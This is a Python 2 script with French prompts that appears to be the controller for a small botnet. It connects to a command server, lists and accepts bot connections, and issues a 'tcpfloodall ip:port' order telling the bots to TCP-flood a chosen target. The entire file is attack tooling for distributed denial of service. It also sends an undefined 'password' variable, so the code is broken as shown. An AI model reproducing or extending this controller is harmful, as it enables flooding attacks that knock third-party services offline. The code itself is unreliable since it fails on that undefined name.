#!/usr/bin/env python2

import subprocess, os, sys, time, threading
from socket import *

intro = """
  ____.     ___.  ___.                    ____       _____         .__            
    |    |____ \_ |__\_ |__   ___________   /  _ \     /     \   ____ |  |__ _____   
    |    \__  \ | __ \| __ \_/ __ \_  __ \  >  _ </\  /  \ /  \ /  _ \|  |  \\__  \  
/\__|    |/ __ \| \_\ \ \_\ \  ___/|  | \/ /  <_\ \/ /    Y    (  <_> )   Y  \/ __ \_
\________(____  /___  /___  /\___  >__|    \_____\ \ \____|__  /\____/|___|  (____  /
              \/    \/    \/     \/               \/         \/            \/     \/ 
_________________0
"""

commands = """

Serveur:
--------
accept                  | Accepte les connections clientes
list                    | Liste les connections
quit                    | Ferme les connections clientes et ferme le controleur

Attaque:
--------------
tcpfloodall ip:port | Attaque TCP flood
\n"""

host = raw_input("Entrez IP du serveur: ")
port = int(raw_input("Entrez le port du serveur: "))

def main():
	print intro
	try:
		s=socket(AF_INET, SOCK_STREAM)
		s.connect((host,port))
	except:
		sys.exit("[ERROR] Can't connect to server")

	s.send(password)

	while 1:
		command = raw_input("Tapez help pour afficher les commandes disponibles > ")
		try:
			if (command == "accept"):
				s.send("accept")
				print s.recv(20480)
			elif (command == "list"):
				s.send("list")
				print s.recv(20480)
			elif ("tcpfloodall " in command):
				s.send(command)
				print "\n"
			elif(command == "quit"):
				s.send("quit")
				s.close()
				break
			elif(command == "help"):
				print commands
			else:
				print "Commande invalide"
		except KeyboardInterrupt:
			try:
				s.send("quit")
				s.close()
				print ""
				break
			except:
				pass
		except:
			print "Connexion fermee"
			s.close()
			break
		
main()